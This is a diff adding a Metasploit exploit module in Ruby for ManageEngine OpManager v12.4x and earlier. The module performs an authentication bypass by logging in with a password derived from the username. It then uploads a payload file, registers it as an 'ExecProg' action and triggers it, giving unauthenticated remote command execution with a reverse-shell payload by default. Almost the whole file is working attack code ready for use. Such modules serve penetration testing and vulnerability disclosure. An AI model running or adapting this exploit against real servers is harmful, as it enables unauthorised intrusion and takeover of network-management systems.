@@ -1,0 +1,292 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+ 
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+ 
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ManageEngine OpManager v12.4x - Unauthenticated Remote Command Execution",
+      'Description'    => %q(
+        This module bypasses the user password requirement in the OpManager v12.4.034 and prior versions.
+        It performs authentication bypass and executes commands on the server.
+
+        /////// This 0day has been published at DEFCON-AppSec Village. ///////
+
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module @ehakkus
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'http://pentest.com.tr/exploits/DEFCON-ManageEngine-OpManager-v12-4-Unauthenticated-Remote-Command-Execution.html' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'WfsDelay' => 60,
+          'RPORT' => 8060,
+          'SSL' => false,
+          'PAYLOAD' => 'generic/shell_reverse_tcp'
+        },
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+        },
+      'Platform'       => ['unix', 'win'],
+      'Targets' =>
+        [
+          [ 'Windows Target',
+            {
+              'Platform' => ['win'],
+              'Arch' => ARCH_CMD,
+            }
+          ],
+          [ 'Linux Target',
+            {
+              'Platform' => ['unix'],
+              'Arch' => ARCH_CMD,
+              'Payload' =>
+                {
+                  'Compat' =>
+                    {
+                      'PayloadType' => 'cmd',
+                    }
+                }
+            }
+          ]
+        ],
+      'DisclosureDate' => '10 August 2019 //DEFCON',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('USERNAME',  [true, 'OpManager Username', 'admin']),
+        OptString.new('TARGETURI',  [true, 'Base path for ME application', '/'])
+      ],self.class)
+  end
+
+  def check_platform(host, port, cookie)
+
+    res = send_request_cgi(
+      'rhost'   => host,
+      'rport'   => port,
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'showTile.do'),
+      'cookie'  => cookie,
+      'vars_get' => {
+        'TileName' => '.ExecProg',
+        'haid' => 'null',
+      }
+    )
+    if res && res.code == 200 && res.body.include?('createExecProgAction')
+      @dir = res.body.split('name="execProgExecDir" maxlength="200" size="40" value="')[1].split('" class=')[0]
+      if @dir =~ /:/
+        platform = Msf::Module::Platform::Windows
+      else 
+        platform = Msf::Module::Platform::Unix
+      end
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred! DIR could not be detected.')
+    end
+    file_up(host, port, cookie, platform, @dir)
+  end
+
+  def file_up(host, port, cookie, platform, dir)
+    if platform == Msf::Module::Platform::Windows
+      filex = ".bat"
+    else
+      if payload.encoded =~ /sh/
+        filex = ".sh"
+      elsif payload.encoded =~ /perl/
+        filex = ".pl"
+      elsif payload.encoded =~ /awk 'BEGIN{/
+        filex = ".sh"
+      elsif payload.encoded =~ /python/
+        filex = ".py"
+      elsif payload.encoded =~ /ruby/
+        filex = ".rb"
+      else
+        fail_with(Failure::Unknown, 'Payload type could not be checked!')
+      end
+    end
+ 
+    @fname= rand_text_alpha(9 + rand(3)) + filex
+    data = Rex::MIME::Message.new
+    data.add_part('./', nil, nil, 'form-data; name="uploadDir"')
+    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"theFile\"; filename=\"#{@fname}\"")
+ 
+    res = send_request_cgi({
+      'rhost'   => host,
+      'rport'   => port,
+      'method' => 'POST',    
+      'data'  => data.to_s,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri, "Upload.do")     
+    })
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success')
+      print_good("#{@fname} malicious file has been uploaded.")
+      create_exec_prog(host, port, cookie, dir, @fname)
+    else
+      fail_with(Failure::Unknown, 'The file could not be uploaded!')
+    end
+  end
+
+  def create_exec_prog(host, port, cookie, dir, fname)
+ 
+    @display = rand_text_alphanumeric(7)
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'rhost'   => host,
+      'rport'   => port,
+      'uri'     =>  normalize_uri(target_uri.path, 'adminAction.do'),
+      'cookie'  => cookie,
+      'vars_post' => {
+        'actions' => '/showTile.do?TileName=.ExecProg&haid=null',
+        'method' => 'createExecProgAction',
+        'id' => 0,
+        'displayname' => @display,
+        'serversite' => 'local',
+        'choosehost' => -2,
+        'abortafter' => 5,
+        'command' => fname,
+        'execProgExecDir' => dir,
+        'cancel' => 'false'
+      }
+    )
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success')
+      actionid = res.body.split('actionid=')[1].split("','710','350','250','200')")[0] 
+      print_status("Transactions completed. Attempting to get a session...")
+      exec(host, port, cookie, actionid)
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+  end
+
+  def exec(host, port, cookie, action)
+    send_request_cgi(
+      'method'  => 'GET',
+      'rhost'   => host,
+      'rport'   => port,
+      'uri'     =>  normalize_uri(target_uri.path, 'common', 'executeScript.do'),
+      'cookie'  => cookie,
+      'vars_get' => {
+        'method' => 'testAction',
+        'actionID' => action,
+        'haid' => 'null'
+      }
+    )
+  end
+ 
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+ 
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end 
+
+  def check
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'apiclient', 'ember', 'Login.jsp'),
+    )
+
+    if res && res.code == 200 && res.body.include?('Logout.do?showPreLogin=false')
+      appm_adr = res.body.split('<iframe src="')[1].split('/Logout.do?showPreLogin=false')[0]
+      am_host = appm_adr.split('://')[1].split(':')[0]
+      am_port = appm_adr.split('://')[1].split(':')[1]
+
+      res = send_request_cgi(
+        'rhost'   => am_host,
+        'rport'   => am_port,
+        'method'  => 'GET',
+        'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+      )
+      # Password check vulnerability in Java Script :/
+      if res.body.include?('j_password.value=username')
+        return Exploit::CheckCode::Vulnerable
+      else 
+        return Exploit::CheckCode::Safe
+      end
+    else 
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def app_login
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'apiclient', 'ember', 'Login.jsp'),
+    )
+    
+    appm_adr = res.body.split('<iframe src="')[1].split('/Logout.do?showPreLogin=false')[0]
+    am_host = appm_adr.split('://')[1].split(':')[0]
+    am_port = appm_adr.split('://')[1].split(':')[1]
+
+    res = send_request_cgi(
+      'rhost'   => am_host,
+      'rport'   => am_port,
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+    )
+
+    @cookie = res.get_cookies
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'rhost'   => am_host,
+      'rport'   => am_port,
+      'cookie'   => @cookie,
+      'uri'     =>  normalize_uri(target_uri.path, '/j_security_check'),
+      'vars_post' => {
+        'clienttype' => 'html',
+        'j_username' => datastore['USERNAME'],
+        'j_password' => datastore['USERNAME'] + "@opm",
+        'submit' => 'Login'
+      }
+    )
+
+    if res && res.code == 302 or 303
+      print_good("Authentication bypass was successfully performed.")
+      res = send_request_cgi(
+        'rhost'   => am_host,
+        'rport'   => am_port,
+        'cookie'  => @cookie,
+        'method'  => 'GET',
+        'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+      )
+
+      @cookie = res.get_cookies
+      check_platform(am_host, am_port, @cookie)
+    else
+      fail_with(Failure::NotVulnerable, 'Failed to perform authentication bypass! Try with another username...')
+    end
+  end
+
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    app_login
+  end
+end
